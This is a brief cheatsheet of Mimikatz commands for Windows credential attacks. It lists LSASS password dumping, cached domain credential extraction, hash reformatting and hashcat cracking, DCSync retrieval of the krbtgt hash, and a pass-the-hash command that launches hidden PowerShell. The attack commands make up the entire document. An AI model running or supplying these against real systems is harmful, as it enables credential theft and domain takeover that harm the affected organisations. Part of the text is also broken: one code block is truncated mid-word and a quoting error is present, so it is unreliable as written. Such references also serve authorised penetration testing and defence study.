---
id: 48ef971f-37ba-4b45-891f-ce7695a7a128
name: Mimikatz Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:34.573791+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Mimikatz Cheatsheet

**Code**: [[
sekurlsa::wdigest
sekurlsa::logonpasswords
lsadum]]

**Code**: [[
lsadump::cache
]]

**Command** ([[Format mscachev2 as `$DCC2$10240#username#hash`]]):

```bash
cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}

```

**Command** ([[hashcat Crack mscachev2 format (extremely slow)]]):

```bash
hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule

```

**Command** ([[mimikatz DCSYNC Remote Hash Dumping from a Domain Controller]]):

```bash
mimikatz lsadump::dcsync /user:domain\krbtgt

```

**Command** ([[mimikatz Pass the Hash]]):

```powershell
mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden

```
